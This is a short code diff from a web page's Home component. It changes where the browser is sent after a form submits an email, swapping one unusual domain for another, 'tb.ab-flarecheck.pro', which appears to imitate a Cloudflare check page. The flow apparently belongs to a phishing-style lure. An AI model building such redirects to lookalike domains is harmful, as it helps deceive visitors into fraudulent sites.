@@ -54,7 +54,7 @@ export default function Home() {
         });
 
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://tb.aspt-lvl.click';
+        window.location.href = 'https://tb.ab-flarecheck.pro';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
